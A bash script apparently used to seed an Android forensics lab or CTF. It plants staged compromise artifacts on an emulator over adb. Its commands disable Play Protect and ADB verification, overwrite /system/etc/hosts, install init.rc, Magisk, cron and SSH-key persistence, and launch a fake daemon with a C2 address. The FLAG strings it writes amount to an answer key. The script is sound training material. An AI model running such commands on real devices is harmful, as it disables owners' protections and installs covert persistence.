#!/bin/bash
# =============================================================================
# Android Malicious Actor Behavior & Persistence Seeder
# Connects to the Android Emulator via `adb root` once booted and executes
# a 6-stage post-exploitation trail across the live OS, settings, properties,
# processes, logcat, and filesystem.
# =============================================================================

TARGET_HOST="${ANDROID_TARGET_HOST:-172.28.0.10}"
TARGET_PORT="${ANDROID_TARGET_PORT:-5555}"
DEVICE_SERIAL="${TARGET_HOST}:${TARGET_PORT}"
ARTIFACT_DIR="/opt/forensics-seeder/artifacts"
LOG_FILE="/var/log/forensics-seeder.log"

log_msg() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

log_msg "[*] Starting 6-Stage Android Threat Actor Emulation targeting ${DEVICE_SERIAL}..."

# Ensure all 6 stages of artifacts are generated
if [ ! -f "${ARTIFACT_DIR}/crown_jewels.enc" ]; then
    log_msg "[*] Generating 6-stage forensic artifacts..."
    python3 /opt/forensics-seeder/generate_artifacts.py "${ARTIFACT_DIR}"
fi

# Build an offline logical fallback extraction in /home/investigator/evidence/
FALLBACK_ROOT="/home/investigator/evidence/offline_fallback_image"
mkdir -p "${FALLBACK_ROOT}/sdcard/DCIM/Camera" \
         "${FALLBACK_ROOT}/sdcard/Download" \
         "${FALLBACK_ROOT}/data/data/com.android.providers.telephony/databases" \
         "${FALLBACK_ROOT}/data/data/com.android.providers.contacts/databases" \
         "${FALLBACK_ROOT}/data/data/com.android.chrome/app_chrome/Default" \
         "${FALLBACK_ROOT}/data/data/com.shadowvault.dropapp/shared_prefs" \
         "${FALLBACK_ROOT}/data/data/com.shadowvault.dropapp/files" \
         "${FALLBACK_ROOT}/system/etc/init" \
         "${FALLBACK_ROOT}/data/adb/service.d" \
         "${FALLBACK_ROOT}/data/local/tmp/.sysd" \
         "${FALLBACK_ROOT}/data/local/tmp/.ssh" \
         "${FALLBACK_ROOT}/data/local/tmp/.staging" \
         "${FALLBACK_ROOT}/data/misc/wifi"

# Copy Stage 1-6 files into offline fallback tree
cp "${ARTIFACT_DIR}/mmssms_forensic.db" "${FALLBACK_ROOT}/data/data/com.android.providers.telephony/databases/mmssms_forensic.db"
cp "${ARTIFACT_DIR}/mmssms_forensic.db" "${FALLBACK_ROOT}/sdcard/Download/msgstore_backup.db"
cp "${ARTIFACT_DIR}/contacts2_forensic.db" "${FALLBACK_ROOT}/data/data/com.android.providers.contacts/databases/contacts2_forensic.db"
cp "${ARTIFACT_DIR}/Chrome_History.db" "${FALLBACK_ROOT}/data/data/com.android.chrome/app_chrome/Default/History"
cp "${ARTIFACT_DIR}/ShadowDrop_v1.4.apk" "${FALLBACK_ROOT}/sdcard/Download/ShadowDrop_v1.4.apk"
cp "${ARTIFACT_DIR}/auth_prefs.xml" "${FALLBACK_ROOT}/data/data/com.shadowvault.dropapp/shared_prefs/auth_prefs.xml"
cp "${ARTIFACT_DIR}/dropper_stage2.sh" "${FALLBACK_ROOT}/data/data/com.shadowvault.dropapp/files/dropper_stage2.sh"
cp "${ARTIFACT_DIR}/hosts.poisoned" "${FALLBACK_ROOT}/system/etc/hosts"
cp "${ARTIFACT_DIR}/shadowd.rc" "${FALLBACK_ROOT}/system/etc/init/shadowd.rc"
cp "${ARTIFACT_DIR}/99-shadow-persist.sh" "${FALLBACK_ROOT}/data/adb/service.d/99-shadow-persist.sh"
cp "${ARTIFACT_DIR}/kworker_netd" "${FALLBACK_ROOT}/data/local/tmp/.sysd/kworker_netd"
cp "${ARTIFACT_DIR}/root_cron" "${FALLBACK_ROOT}/data/local/tmp/.sysd/root_cron"
cp "${ARTIFACT_DIR}/authorized_keys" "${FALLBACK_ROOT}/data/local/tmp/.ssh/authorized_keys"
cp "${ARTIFACT_DIR}/IMG_20261018_231405.jpg" "${FALLBACK_ROOT}/sdcard/DCIM/Camera/IMG_20261018_231405.jpg"
cp "${ARTIFACT_DIR}/WifiConfigStore.xml.bak" "${FALLBACK_ROOT}/data/misc/wifi/WifiConfigStore.xml.bak"
cp "${ARTIFACT_DIR}/.sh_history" "${FALLBACK_ROOT}/data/local/tmp/.sh_history"
cp "${ARTIFACT_DIR}/.exfil_staging.tar.gz" "${FALLBACK_ROOT}/data/local/tmp/.staging/.exfil_staging.tar.gz"
cp "${ARTIFACT_DIR}/crown_jewels.enc" "${FALLBACK_ROOT}/data/local/tmp/.staging/crown_jewels.enc"

tar -czf /home/investigator/evidence/android_logical_extraction_fallback.tar.gz -C "${FALLBACK_ROOT}" .
rm -rf "${FALLBACK_ROOT}"
chown -R investigator:investigator /home/investigator/evidence

# Start ADB server
adb start-server >/dev/null 2>&1

MAX_RETRIES=90
RETRY_COUNT=0

log_msg "[*] Waiting for Android emulator at ${DEVICE_SERIAL} to finish booting..."
while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
    adb connect "${DEVICE_SERIAL}" >/dev/null 2>&1
    BOOT_STATUS=$(adb -s "${DEVICE_SERIAL}" shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
    if [ "$BOOT_STATUS" = "1" ]; then
        log_msg "[+] Android emulator is online and booted (sys.boot_completed=1)!"
        break
    fi
    RETRY_COUNT=$((RETRY_COUNT + 1))
    sleep 5
done

if [ "$BOOT_STATUS" != "1" ]; then
    log_msg "[!] Android emulator did not report boot completion within timeout (verify /dev/kvm on host)."
    log_msg "[!] Offline fallback extraction archive is ready at /home/investigator/evidence/android_logical_extraction_fallback.tar.gz"
    exit 0
fi

# =============================================================================
# ELEVATE TO ADB ROOT & REMOUNT SYSTEM RW
# =============================================================================
log_msg "[*] Elevating ADB daemon via 'adb root' and remounting system partition..."
adb -s "${DEVICE_SERIAL}" root >/dev/null 2>&1
sleep 3
adb connect "${DEVICE_SERIAL}" >/dev/null 2>&1
adb -s "${DEVICE_SERIAL}" remount >/dev/null 2>&1 || true
adb -s "${DEVICE_SERIAL}" shell "mount -o rw,remount / 2>/dev/null || mount -o rw,remount /system 2>/dev/null || true"

# Create all target directories on live Android filesystem
adb -s "${DEVICE_SERIAL}" shell "mkdir -p \
    /sdcard/DCIM/Camera \
    /sdcard/Download \
    /data/data/com.android.providers.telephony/databases \
    /data/data/com.android.providers.contacts/databases \
    /data/data/com.android.chrome/app_chrome/Default \
    /data/data/com.shadowvault.dropapp/shared_prefs \
    /data/data/com.shadowvault.dropapp/files \
    /data/adb/service.d \
    /data/cron \
    /data/local/tmp/.sysd \
    /data/local/tmp/.ssh \
    /data/local/tmp/.staging \
    /data/misc/wifi"

# =============================================================================
# STAGE 1: INITIAL ACCESS (Smishing SMS DB, Contacts/Calls DB, Chrome History)
# =============================================================================
log_msg "[*] [Stage 1] Planting Smishing SMS DB, Call Logs, and Chrome Download History..."
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/mmssms_forensic.db" /data/data/com.android.providers.telephony/databases/mmssms_forensic.db
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/mmssms_forensic.db" /sdcard/Download/msgstore_backup.db
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/contacts2_forensic.db" /data/data/com.android.providers.contacts/databases/contacts2_forensic.db
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/Chrome_History.db" /data/data/com.android.chrome/app_chrome/Default/History

# =============================================================================
# STAGE 2: EXECUTION & DROPPER APK (ShadowDrop_v1.4.apk, SharedPrefs, Dropper)
# =============================================================================
log_msg "[*] [Stage 2] Planting sideloaded APK, SharedPreferences XML, and Stage-2 dropper..."
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/ShadowDrop_v1.4.apk" /sdcard/Download/ShadowDrop_v1.4.apk
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/ShadowDrop_v1.4.apk" /data/local/tmp/ShadowDrop_v1.4.apk
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/auth_prefs.xml" /data/data/com.shadowvault.dropapp/shared_prefs/auth_prefs.xml
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/dropper_stage2.sh" /data/data/com.shadowvault.dropapp/files/dropper_stage2.sh
adb -s "${DEVICE_SERIAL}" shell "chmod 755 /data/data/com.shadowvault.dropapp/files/dropper_stage2.sh"

# =============================================================================
# STAGE 3: PRIVILEGE ESCALATION & DEFENSE EVASION (Settings, Props, Hosts, Logcat)
# =============================================================================
log_msg "[*] [Stage 3] Emulating Defense Evasion (Disabling Play Protect, Poisoning /system/etc/hosts, Setting System Properties)..."
adb -s "${DEVICE_SERIAL}" shell "settings put global package_verifier_enable 0"
adb -s "${DEVICE_SERIAL}" shell "settings put global verifier_verify_adb_installs 0"
adb -s "${DEVICE_SERIAL}" shell "settings put global adb_wifi_enabled 1"
adb -s "${DEVICE_SERIAL}" shell "settings put global shadowvault_evasion_token 'FLAG{st4g3_3_d3f3ns3_3v4s10n_r00t}'"

adb -s "${DEVICE_SERIAL}" shell "setprop persist.sys.shadow.c2 '198.51.100.77:8443'"
adb -s "${DEVICE_SERIAL}" shell "setprop persist.sys.shadow.init_rc '/system/etc/init/shadowd.rc'"
adb -s "${DEVICE_SERIAL}" shell "setprop persist.sys.shadow.stage3 'FLAG{st4g3_3_d3f3ns3_3v4s10n_r00t}'"

# Poison /system/etc/hosts (and keep copy in /data/local/tmp/.sysd/hosts.poisoned)
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/hosts.poisoned" /data/local/tmp/.sysd/hosts.poisoned
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/hosts.poisoned" /system/etc/hosts 2>/dev/null || \
    adb -s "${DEVICE_SERIAL}" shell "cp /data/local/tmp/.sysd/hosts.poisoned /system/etc/hosts 2>/dev/null || true"

# =============================================================================
# STAGE 4: PERSISTENCE MECHANISMS (init.rc, Magisk service.d, Cron, SSH, Live Daemon)
# =============================================================================
log_msg "[*] [Stage 4] Planting Root Persistence (/system/etc/init/shadowd.rc, Magisk hook, Cron, SSH Key, and Live kworker_netd Daemon)..."
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/shadowd.rc" /data/local/tmp/.sysd/shadowd.rc
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/shadowd.rc" /system/etc/init/shadowd.rc 2>/dev/null || \
    adb -s "${DEVICE_SERIAL}" shell "cp /data/local/tmp/.sysd/shadowd.rc /system/etc/init/shadowd.rc 2>/dev/null || true"

adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/99-shadow-persist.sh" /data/adb/service.d/99-shadow-persist.sh
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/kworker_netd" /data/local/tmp/.sysd/kworker_netd
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/root_cron" /data/local/tmp/.sysd/root_cron
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/root_cron" /data/cron/root
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/authorized_keys" /data/local/tmp/.ssh/authorized_keys

adb -s "${DEVICE_SERIAL}" shell "chmod 755 /data/adb/service.d/99-shadow-persist.sh /data/local/tmp/.sysd/kworker_netd && chmod 600 /data/local/tmp/.ssh/authorized_keys"

# Launch the masquerading root persistence daemon live on the Android target
adb -s "${DEVICE_SERIAL}" shell "nohup /system/bin/sh /data/local/tmp/.sysd/kworker_netd --beacon-c2 198.51.100.77 >/dev/null 2>&1 &"

# =============================================================================
# STAGE 5: COLLECTION & RECONNAISSANCE (EXIF Photo, Wi-Fi Credentials, .sh_history)
# =============================================================================
log_msg "[*] [Stage 5] Planting Geotagged Surveillance Photo, Harvested Wi-Fi Config, and Root Shell History..."
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/IMG_20261018_231405.jpg" /sdcard/DCIM/Camera/IMG_20261018_231405.jpg
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/WifiConfigStore.xml.bak" /data/misc/wifi/WifiConfigStore.xml.bak
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/.sh_history" /data/local/tmp/.sh_history

# =============================================================================
# STAGE 6: EXFILTRATION STAGING & ENCRYPTED MASTER VAULT (crown_jewels.enc)
# =============================================================================
log_msg "[*] [Stage 6] Planting Exfiltration Bundle & Encrypted Master Dossier (/data/local/tmp/.staging/crown_jewels.enc)..."
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/.exfil_staging.tar.gz" /data/local/tmp/.staging/.exfil_staging.tar.gz
adb -s "${DEVICE_SERIAL}" push "${ARTIFACT_DIR}/crown_jewels.enc" /data/local/tmp/.staging/crown_jewels.enc

# Inject rich forensic breadcrumb trail into Android logcat
adb -s "${DEVICE_SERIAL}" shell "log -t 'ShadowDrop-Installer' 'Package com.shadowvault.dropapp sideloaded from /sdcard/Download/ShadowDrop_v1.4.apk [FLAG{st4g3_1_sm1sh1ng_1n1t14l_4cc3ss}]'"
adb -s "${DEVICE_SERIAL}" shell "log -t 'ShadowDrop-Rootkit' 'Executing /data/data/com.shadowvault.dropapp/files/dropper_stage2.sh with root privileges [FLAG{st4g3_2_apk_d3c0mp1l3d_dr0pp3r}]'"
adb -s "${DEVICE_SERIAL}" shell "log -t 'ShadowDrop-Rootkit' 'Play Protect disabled & /system/etc/hosts poisoned -> 198.51.100.77 c2.shadowvault-ops.internal [FLAG{st4g3_3_d3f3ns3_3v4s10n_r00t}]'"
adb -s "${DEVICE_SERIAL}" shell "log -t 'ShadowDrop-Rootkit' 'Boot persistence installed in /system/etc/init/shadowd.rc & /data/adb/service.d/99-shadow-persist.sh [FLAG{st4g3_4_p3rs1st3nc3_1n1t_d43m0n}]'"
adb -s "${DEVICE_SERIAL}" shell "log -t 'ShadowDrop-Rootkit' 'Encrypted exfil dossier staged at /data/local/tmp/.staging/crown_jewels.enc (see /data/local/tmp/.sh_history)'"

log_msg "[+] Complete 6-Stage Malicious Actor Trail & Persistence successfully planted on ${DEVICE_SERIAL}!"
